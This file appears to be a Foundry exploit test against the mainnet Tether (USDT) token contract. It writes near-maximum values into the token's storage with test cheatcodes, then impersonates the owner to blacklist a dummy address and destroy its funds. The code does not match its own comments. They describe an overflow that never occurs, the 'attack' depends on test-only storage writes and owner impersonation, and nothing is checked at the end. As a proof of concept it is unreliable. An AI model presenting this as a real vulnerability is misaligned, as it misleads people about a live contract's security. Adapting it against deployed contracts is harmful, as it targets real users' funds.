// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITetherToken {
    function issue(uint amount) external;
    function owner() external view returns (address);
    function _totalSupply() external view returns (uint256);
    function balances(address) external view returns (uint256);
    function addBlackList(address _evilUser) external;
    function destroyBlackFunds(address _blackListedUser) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address internal evilUser = address(0xDEADBEEF);
    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address attacker = address(this);
    ITetherToken internal token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = ITetherToken(TARGET);

        // The value that, when added with 2, will overflow to 0.
        // type(uint256).max - 1 is equivalent to 2**256 - 2.
        uint256 nearMaxValue = type(uint256).max - 1;

        // As per the contract's inheritance structure, _totalSupply is at storage slot 1.
        bytes32 totalSupplySlot = bytes32(uint256(1));

        // The `balances` mapping is at storage slot 2.
        address contractOwner = token.owner();
        bytes32 ownerBalanceSlot = keccak256(abi.encodePacked(contractOwner, uint256(2)));

        // Use vm.store to set the preconditions.
        vm.store(TARGET, totalSupplySlot, bytes32(uint256(nearMaxValue)));
        vm.store(TARGET, ownerBalanceSlot, bytes32(uint256(nearMaxValue)));

        // Verify that the preconditions are set correctly.
        assertEq(token._totalSupply(), nearMaxValue);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        address contractOwner = token.owner();

                vm.startPrank(contractOwner);

                // Blacklist the user whose funds we want to destroy
                token.addBlackList(evilUser);

                // Call destroyBlackFunds to subtract the balance from _totalSupply
                token.destroyBlackFunds(evilUser);

                vm.stopPrank();
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

